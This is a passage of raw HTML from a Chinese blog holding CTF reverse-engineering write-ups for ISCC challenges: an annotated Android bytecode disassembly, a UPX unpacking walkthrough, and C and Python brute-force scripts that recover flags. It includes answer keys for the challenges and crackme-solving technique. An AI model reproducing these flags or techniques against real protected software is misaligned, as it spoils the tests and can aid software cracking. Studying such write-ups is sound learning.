class="line">CODE:00159D48</span><br><span class="line">CODE:00159D48 loc_159D48:                             # CODE XREF: CODE:00159BF8↑j</span><br><span class="line">CODE:00159D48                 .line 32</span><br><span class="line">CODE:00159D48                 invoke-virtual                  &#123;v0&#125;, &lt;ref StringBuilder.toString() imp. @ _def_StringBuilder_toString@L&gt;</span><br><span class="line">CODE:00159D4E                 move-result-object              v5</span><br><span class="line">CODE:00159D50                 return-object                   v5</span><br><span class="line">CODE:00159D50 # ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<ul>
<li>分析一下函数主要逻辑</li>
<li>函数首先给v8 v9 v10函数分别赋值0 1 2</li>
<li>然后程序分配了一块内存来作为输出</li>
<li>然后函数进入了一轮循环,大体上来看,函数是以字符串长度和循环下标来作为判断,循环尾部会给i每次递增三</li>
<li>细分析循环内部逻辑,这一段大概有9段类似的结构,选取其中的第一块来分析</li>
<li>首先获取二维数组key的地址,然后以此加上两个常量,这个常量就是之前提到过的v8 v9 v10,这里猜测为key[x][y]中的x,y</li>
<li>扫了一眼后面的指令,取常量的顺序依次是00,01,02,10,11,12,20,21,22可以确定,这个操作就是在取key对应的xy的值</li>
<li>随后函数又从input里面取值,{input,i}这样的取值方式取值后,将所取值减去65,值得注意的是寄存器v7,后续取值操作不再是{input,i},而是{input,v7}(其中v7 = i + 1或2),这就可以解释为什么i += 3了</li>
<li>依次进行这些操作以后,函数会将每一组(共三组)算得的值%26 + 65,append进入刚开始申请的的空间,最后输出函数,下面是我部分化简过一部分的汇编指令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">CODE:00159BE4                 new-instance                    output, &lt;t: StringBuilder&gt;</span><br><span class="line">CODE:00159BE8                 invoke-direct                   &#123;output&#125;, &lt;void StringBuilder.&lt;init&gt;() imp. @ _def_StringBuilder__init_@V&gt;</span><br><span class="line">CODE:00159BEE                 .line 17</span><br><span class="line">CODE:00159BEE                 const/4                         i, 0</span><br><span class="line">CODE:00159BF0</span><br><span class="line">CODE:00159BF0 loc_159BF0:                             # CODE XREF: CODE:00159D44↓j</span><br><span class="line">CODE:00159BF0                 invoke-virtual                  &#123;i1&#125;, &lt;int String.length() imp. @ _def_String_length@I&gt;</span><br><span class="line">CODE:00159BF6                 move-result                     v5</span><br><span class="line">CODE:00159BF8                 if-ge                           i, v5, loc_159D48</span><br><span class="line">CODE:00159BFC                 .line 18</span><br><span class="line">CODE:00159BFC                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159C00                 aget-object                     v5, v5, 0</span><br><span class="line">CODE:00159C04                 aget                            v5, v5, 0</span><br><span class="line">CODE:00159C08                 invoke-virtual                  input[i]</span><br><span class="line">CODE:00159C0E                 move-result                     v6 = input[i]</span><br><span class="line">CODE:00159C10                 add-int/lit8                    v6 = input[i] - 0x41</span><br><span class="line">CODE:00159C14                 mul-int/2addr                   v5 = (input[i] - 0x41)*key[0][0]</span><br><span class="line">CODE:00159C16                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C1A                 aget-object                     v6, v6, 0</span><br><span class="line">CODE:00159C1E                 aget                            v6, v6, 1</span><br><span class="line">CODE:00159C22                 add-int/lit8                    v7 = i + 1</span><br><span class="line">CODE:00159C26                 .line 19</span><br><span class="line">CODE:00159C26                 invoke-virtual                  input[i + 1]</span><br><span class="line">CODE:00159C2C                 move-result                     v7 = input[i + 1]</span><br><span class="line">CODE:00159C2E                 add-int/lit8                    v7 = input[i + 1] - 0x41</span><br><span class="line">CODE:00159C32                 mul-int/2addr                   v6 = (input[i + 1] - 0x41)*key[0][1]</span><br><span class="line">CODE:00159C34                 add-int/2addr                   v5, += v6</span><br><span class="line">CODE:00159C36                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C3A                 aget-object                     v6, v6, 0</span><br><span class="line">CODE:00159C3E                 aget                            v6, v6, 2</span><br><span class="line">CODE:00159C42                 add-int/lit8                    v7 = i + 2</span><br><span class="line">CODE:00159C46                 .line 20</span><br><span class="line">CODE:00159C46                 invoke-virtual                  input[i + 2]</span><br><span class="line">CODE:00159C4C                 move-result                     v7 = input[i + 2]</span><br><span class="line">CODE:00159C4E                 add-int/lit8                    v7 = input[i + 2] - 0x41</span><br><span class="line">CODE:00159C52                 mul-int/2addr                   v6 = (input[i + 2] - 0x41)*key[0][2]</span><br><span class="line">CODE:00159C54                 add-int                         a1 = (input[i] - 0x41)*key[0][0] + (input[i + 1] - 0x41)*key[0][1] + (input[i + 2] - 0x41)*key[0][2]</span><br><span class="line">CODE:00159C58                 .line 21</span><br><span class="line">CODE:00159C58                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159C5C                 aget-object                     v5, v5, 1</span><br><span class="line">CODE:00159C60                 aget                            v5, v5, 0</span><br><span class="line">CODE:00159C64                 invoke-virtual                  input[i]</span><br><span class="line">CODE:00159C6A                 move-result                     v6</span><br><span class="line">CODE:00159C6C                 add-int/lit8                    v6, v6, - 0x41</span><br><span class="line">CODE:00159C70                 mul-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C72                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C76                 aget-object                     v6, v6, 1</span><br><span class="line">CODE:00159C7A                 aget                            v6, v6, 1</span><br><span class="line">CODE:00159C7E                 add-int/lit8                    v7, i, 1</span><br><span class="line">CODE:00159C82                 .line 22</span><br><span class="line">CODE:00159C82                 invoke-virtual                  input[v7]</span><br><span class="line">CODE:00159C88                 move-result                     v7</span><br><span class="line">CODE:00159C8A                 add-int/lit8                    v7 = v7 - 0x41</span><br><span class="line">CODE:00159C8E                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159C90                 add-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C92                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C96                 aget-object                     v6, v6, 1</span><br><span class="line">CODE:00159C9A                 aget                            v6, v6, 2</span><br><span class="line">CODE:00159C9E                 add-int/lit8                    v7, i, 2</span><br><span class="line">CODE:00159CA2                 .line 23</span><br><span class="line">CODE:00159CA2                 invoke-virtual                  input[v7]</span><br><span class="line">CODE:00159CA8                 move-result                     v7</span><br><span class="line">CODE:00159CAA                 add-int/lit8                    v7 = v7 - 0x41</span><br><span class="line">CODE:00159CAE                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159CB0                 add-int                         a2, v5, v6</span><br><span class="line">CODE:00159CB4                 .line 24</span><br><span class="line">CODE:00159CB4                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159CB8                 aget-object                     v5, v5, 2</span><br><span class="line">CODE:00159CBC                 aget                            v5, v5, 0</span><br><span class="line">CODE:00159CC0                 invoke-virtual                  input[i]</span><br><span class="line">CODE:00159CC6                 move-result                     v6</span><br><span class="line">CODE:00159CC8                 add-int/lit8                    v6, v6, - 0x41</span><br><span class="line">CODE:00159CCC                 mul-int/2addr                   v5, v6</span><br><span class="line">CODE:00159CCE                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159CD2                 aget-object                     v6, v6, 2</span><br><span class="line">CODE:00159CD6                 aget                            v6, v6, 1</span><br><span class="line">CODE:00159CDA                 add-int/lit8                    v7, i, 1</span><br><span class="line">CODE:00159CDE                 .line 25</span><br><span class="line">CODE:00159CDE                 invoke-virtual                  input[v7]</span><br><span class="line">CODE:00159CE4                 move-result                     v7</span><br><span class="line">CODE:00159CE6                 add-int/lit8                    v7 = v7 - 0x41</span><br><span class="line">CODE:00159CEA                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159CEC                 add-int/2addr                   v5, v6</span><br><span class="line">CODE:00159CEE                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159CF2                 aget-object                     v6, v6, 2</span><br><span class="line">CODE:00159CF6                 aget                            v6, v6, 2</span><br><span class="line">CODE:00159CFA                 add-int/lit8                    v7, i, 2</span><br><span class="line">CODE:00159CFE                 .line 26</span><br><span class="line">CODE:00159CFE                 invoke-virtual                  input[v7]</span><br><span class="line">CODE:00159D04                 move-result                     v7</span><br><span class="line">CODE:00159D06                 add-int/lit8                    v7 = v7 - 0x41</span><br><span class="line">CODE:00159D0A                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159D0C                 add-int                         a3, v5, v6</span><br><span class="line">CODE:00159D10                 .line 27</span><br><span class="line">CODE:00159D10                 rem-int/lit8                    v5 = a1 % 26</span><br><span class="line">CODE:00159D14                 add-int/lit8                    v5 = v5 + 0x41</span><br><span class="line">CODE:00159D18                 int-to-char                     v5 = chr(v5)</span><br><span class="line">CODE:00159D1A                 invoke-virtual                  output.append[v5]</span><br><span class="line">CODE:00159D20                 .line 28</span><br><span class="line">CODE:00159D20                 rem-int/lit8                    v5, a2, 26</span><br><span class="line">CODE:00159D24                 add-int/lit8                    v5, v5, 65</span><br><span class="line">CODE:00159D28                 int-to-char                     v5, v5</span><br><span class="line">CODE:00159D2A                 invoke-virtual                  output.append[v5]</span><br><span class="line">CODE:00159D30                 .line 29</span><br><span class="line">CODE:00159D30                 rem-int/lit8                    v5, a3, 26</span><br><span class="line">CODE:00159D34                 add-int/lit8                    v5, v5, 0x41</span><br><span class="line">CODE:00159D38                 int-to-char                     v5, v5</span><br><span class="line">CODE:00159D3A                 invoke-virtual                  output.append[v5]</span><br><span class="line">CODE:00159D40                 .line 17</span><br><span class="line">CODE:00159D40                 add-int/lit8                    i += 3</span><br><span class="line">CODE:00159D44                 goto/16</span><br></pre></td></tr></table></figure>

<ul>
<li><p>感觉挺像希尔加密的,但是现场不好去外网找工具,直接爆破好了</p>
</li>
<li><p>爆破后发现有多解…maye,可能是取模的原因,但是希尔密码应该不是这样的啊…先不管这些,从爆出来的一些字符串,可以拼出flag的值 key{We1c0me_T0_1SCC2IO8}</p>
</li>
<li><p>好的爆破脚本在这里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> m[<span class="number">9</span>] = &#123;<span class="number">17</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag_enc[<span class="number">25</span>]=&#123;<span class="number">79</span>, <span class="number">89</span>, <span class="number">85</span>, <span class="number">71</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">72</span>, <span class="number">62</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">79</span>, <span class="number">67</span>, <span class="number">66</span>, <span class="number">88</span>, <span class="number">70</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">47</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">89</span>, <span class="number">89</span>, <span class="number">69</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> ra,c1,c2,c3;</span><br><span class="line">    <span class="keyword">for</span>(ra = <span class="number">0</span>;ra &lt;<span class="number">8</span>;ra++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(c1 = <span class="number">48</span>;c1 &lt; <span class="number">127</span>; c1++)</span><br><span class="line">            <span class="keyword">for</span>(c2 = <span class="number">48</span>;c2 &lt; <span class="number">127</span>; c2++)</span><br><span class="line">                <span class="keyword">for</span>(c3 = <span class="number">48</span>;c3 &lt; <span class="number">127</span>; c3++)&#123;</span><br><span class="line">                        <span class="keyword">int</span> a1 = (c1<span class="number">-65</span>)*m[<span class="number">0</span>] + (c2<span class="number">-65</span>)*m[<span class="number">1</span>] + (c3<span class="number">-65</span>)*m[<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">int</span> a2 = (c1<span class="number">-65</span>)*m[<span class="number">3</span>] + (c2<span class="number">-65</span>)*m[<span class="number">4</span>] + (c3<span class="number">-65</span>)*m[<span class="number">5</span>];</span><br><span class="line">                        <span class="keyword">int</span> a3 = (c1<span class="number">-65</span>)*m[<span class="number">6</span>] + (c2<span class="number">-65</span>)*m[<span class="number">7</span>] + (c3<span class="number">-65</span>)*m[<span class="number">8</span>];</span><br><span class="line">                        <span class="keyword">if</span>(<span class="number">65</span> + a1%<span class="number">26</span> == flag_enc[ra*<span class="number">3</span> + <span class="number">0</span>]&amp;&amp;</span><br><span class="line">                        <span class="number">65</span> + a2%<span class="number">26</span> == flag_enc[ra*<span class="number">3</span> + <span class="number">1</span>]&amp;&amp;</span><br><span class="line">                        <span class="number">65</span> + a3%<span class="number">26</span> == flag_enc[ra*<span class="number">3</span> + <span class="number">2</span>])&#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"%c%c%c "</span>,c1,c2,c3);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n===================================================================\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>之后py了出题的师傅,师傅说这是一个自己做的壳,一开始还想加反调试和混淆(还要感谢出题师傅手下留情 ,不过正确的思路据说是修复一下直接上jd-gui,我太菜了所以绕了远路只好硬怼汇编= =</p>
</li>
<li><p>还要说一下不同语言的取余操作内部好像是不一样的,比如c语言对负数取余就能出负数,而python只能是正数,一开始被这个鸟东西坑了好久..</p>
</li>
<li><p>还是要感谢北理的师傅们的,也学到了很多东西,希望明年还能来打(逃</p>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/iscc安卓逆向/" data-id="cjyn83qfu003bicth07ryi96c" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-iscc" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/iscc/" class="article-date">
  <time datetime="2019-07-28T17:11:01.676Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/二进制/">二进制</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/iscc/">ISCC逆向wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="re150"><a href="#re150" class="headerlink" title="re150"></a>re150</h1><ul>
<li>upx壳,重定位,选择带壳调试,OD载入,在入口点单步,然后在数据窗口ESP处下硬件断点</li>
<li>运行程序,程序断在popad下一行,此时定位目标字符串,在校验函数处下第二断点</li>
<li>运行程序,从寄存器中跟随,找到扰乱后的测试字符串,跑脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="string">"edfgcbhia0jk98lm76no54pq32rs1"</span></span><br><span class="line">enc = <span class="string">"s_imsaplw_e_siishtnt&#123;g_ialt&#125;F"</span></span><br><span class="line">table = <span class="string">"1234567890abcdefghijklmnopqrs"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">    flag += enc[n.index(i)]</span><br><span class="line">    <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="re250"><a href="#re250" class="headerlink" title="re250"></a>re250</h1><ul>
<li>两个函数,由while组成,看下逻辑图,典型控制流平坦化(0llvm)</li>
<li>下断后动态调试,得知程序算法(后知是矩阵乘法)</li>
<li>分析第二个函数,发现输入的数组输出就是其base64,即原生base64</li>
<li>选择爆破</li>
<li><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> base64[<span class="number">64</span>] = <span class="string">"FeVYKw6a0lDIOsnZQ5EAf2MvjS1GUiLWPTtH4JqRgu3dbC8hrcNo9/mxzpXBky7+"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> m[<span class="number">16</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">2</span>,</span><br><span class="line">  <span class="number">2</span>,</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  <span class="number">4294967291</span>,</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="number">3</span>,</span><br><span class="line">  <span class="number">4294967293</span>,</span><br><span class="line">  <span class="number">4294967295</span>,</span><br><span class="line">  <span class="number">4294967294</span>,</span><br><span class="line">  <span class="number">4294967293</span>,</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  <span class="number">4294967295</span>,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  <span class="number">4294967294</span>,</span><br><span class="line">  <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">num_strchr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *pindex = <span class="built_in">strchr</span>(str, c);</span><br><span class="line">	<span class="keyword">return</span> pindex - str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dbase64</span><span class="params">(<span class="keyword">char</span> *s,<span class="keyword">char</span> * encode_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (s[i] != <span class="string">'='</span>)</span><br><span class="line">			a[i] = num_strchr(base64, s[i]);</span><br><span class="line">		<span class="keyword">if</span> (s[i + <span class="number">1</span>] != <span class="string">'='</span>)</span><br><span class="line">			a[i + <span class="number">1</span>] = num_strchr(base64, s[i + <span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">if</span> (s[i + <span class="number">2</span>] != <span class="string">'='</span>)</span><br><span class="line">			a[i + <span class="number">2</span>] = num_strchr(base64, s[i + <span class="number">2</span>]);</span><br><span class="line">		<span class="keyword">if</span> (s[i + <span class="number">3</span>] != <span class="string">'='</span>)</span><br><span class="line">			a[i + <span class="number">3</span>] = num_strchr(base64, s[i + <span class="number">3</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>, j += <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		encode_flag[j] = a[i] &lt;&lt; <span class="number">2</span> | a[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">		encode_flag[j + <span class="number">1</span>] = (a[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span> | a[i + <span class="number">2</span>] &gt;&gt; <span class="number">2</span>;</span><br><span class="line">		encode_flag[j + <span class="number">2</span>] = (a[i + <span class="number">2</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">6</span> | a[i + <span class="number">3</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag_b64enc[<span class="number">32</span>] = <span class="string">"lUFBuT7hADvItXEGn7KgTEjqw8U5VQUq"</span>;</span><br><span class="line">    <span class="keyword">char</span> flag_enc[<span class="number">24</span>];</span><br><span class="line">    <span class="keyword">char</span> t[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> ra,i,j,c1,c2,c3,c4;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> p[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    dbase64(flag_b64enc,flag_enc);</span><br><span class="line">    <span class="comment">// for(i = 0;i &lt; 24;i++)&#123;</span></span><br><span class="line">    <span class="comment">//     printf("%x,",flag_enc[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    ra = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(ra = <span class="number">0</span>;ra &lt;<span class="number">6</span>;ra++)</span><br><span class="line">    <span class="keyword">for</span>(c1 = <span class="number">33</span>;c1 &lt; <span class="number">127</span>; c1++)</span><br><span class="line">        <span class="keyword">for</span>(c2 = <span class="number">33</span>;c2 &lt; <span class="number">127</span>; c2++)</span><br><span class="line">            <span class="keyword">for</span>(c3 = <span class="number">33</span>;c3 &lt; <span class="number">127</span>; c3++)</span><br><span class="line">                <span class="keyword">for</span>(c4 = <span class="number">33</span>;c4 &lt; <span class="number">127</span>; c4++)&#123;</span><br><span class="line">                    t[<span class="number">0</span>]=c1;</span><br><span class="line">                    t[<span class="number">1</span>]=c2;</span><br><span class="line">                    t[<span class="number">2</span>]=c3;</span><br><span class="line">                    t[<span class="number">3</span>]=c4;</span><br><span class="line">                    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)&#123;</span><br><span class="line">                            p[i] += m[i*<span class="number">4</span> + j] * t[j];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(((<span class="keyword">char</span>)p[<span class="number">0</span>] == flag_enc[ra*<span class="number">4</span> + <span class="number">0</span>])&amp;&amp;((<span class="keyword">char</span>)p[<span class="number">1</span>] == flag_enc[ra*<span class="number">4</span> + <span class="number">1</span>])&amp;&amp;((<span class="keyword">char</span>)p[<span class="number">2</span>] == flag_enc[ra*<span class="number">4</span> + <span class="number">2</span>])&amp;&amp;((<span class="keyword">char</span>)p[<span class="number">3</span>] == flag_enc[ra*<span class="number">4</span> + <span class="number">3</span>]))&#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>,c1,c2,c3,c4);</span><br><span class="line">                    &#125;</span><br><span class="line">                    p[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">                    p[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">                    p[<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">                    p[<span class="number">3</span>]=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/iscc/" data-id="cjyn83qei0016icthud5ryhdv" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
